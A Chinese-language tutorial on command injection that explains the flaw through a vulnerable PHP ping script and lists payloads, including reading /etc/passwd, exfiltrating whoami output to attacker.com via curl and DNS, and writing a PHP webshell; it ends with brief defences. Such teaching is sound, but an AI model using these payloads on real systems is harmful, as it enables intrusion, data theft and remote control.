# 命令注入

````markdown
# 命令注入

## 一、漏洞定义

命令注入（Command Injection）是指攻击者通过可控参数将系统命令注入到 Web 应用的后台执行环境中，导致服务器执行攻击者构造的任意系统命令。其本质是开发者将用户输入拼接进系统命令字符串中，并调用 shell 或系统 API 执行，未做有效过滤。

---

## 二、常见类型分类

| 类型             | 描述                                                       |
|------------------|------------------------------------------------------------|
| 基本命令注入     | 利用 `;`, `&&`, `|` 等符号拼接执行多个命令                |
| 盲命令注入       | 没有回显结果，通过响应延迟或状态推断是否注入成功          |
| 文件型命令注入   | 将结果写入可访问文件（如日志、Web 路径）                  |
| 带外命令注入     | 利用 curl、ping、dns 等命令将执行结果回传给攻击者         |

---

## 三、漏洞原理详解

后台代码直接将用户输入拼接到 shell 命令中并执行，例如：

```php
<?php
$ip = $_GET["ip"];
system("ping -c 4 " . $ip);
?>
````

若用户输入为 `8.8.8.8; whoami`，则实际执行命令为：

```bash
ping -c 4 8.8.8.8; whoami
```

攻击者即可执行任意系统命令。

***

### 四、典型实例（含 POC）

#### 1. Linux 环境命令注入

**URL 示例**

```http
http://example.com/ping.php?ip=127.0.0.1;id
```

**Payload 列表**

```bash
127.0.0.1;id
127.0.0.1 && whoami
127.0.0.1 | ls /var/www/html
127.0.0.1 `cat /etc/passwd`
```

***

#### 2. Windows 环境命令注入

```http
http://example.com/ping.php?ip=127.0.0.1&whoami
```

Payload 示例：

```cmd
127.0.0.1 & whoami
127.0.0.1 | dir
127.0.0.1 && type C:\Windows\System32\drivers\etc\hosts
```

***

#### 3. 盲注（基于时间）

```http
http://example.com/ping.php?ip=127.0.0.1; sleep 5
```

若响应明显延迟 5 秒，则说明注入成功。

***

#### 4. 带外命令注入（OOB）

```http
http://example.com/ping.php?ip=127.0.0.1; curl attacker.com/`whoami`
```

或：

```bash
127.0.0.1 | nslookup `whoami`.attacker.com
```

通过监听 DNS/HTTP 请求回传数据。

***

#### 5. 文件型命令注入（写入 WebShell）

```bash
127.0.0.1; echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php
```

然后通过访问 `http://example.com/shell.php?cmd=whoami` 实现远程命令执行。

***

### 五、利用方式

* 读取服务器敏感信息（如 `/etc/passwd`, `/etc/shadow`）
* 获取 Webshell 或反弹 shell 实现远程控制
* 权限驻留、横向移动、提权、攻击内网其他服务

***

### 六、防御与修复方式

* 参数值过滤敏感字符(黑名单)
* 优先使用安全函数（如 `execvp`, `subprocess.run` 带数组参数）
* 对输入参数进行格式校验(白名单)
* 限制 Web 进程权限（www-data、nginx）

***
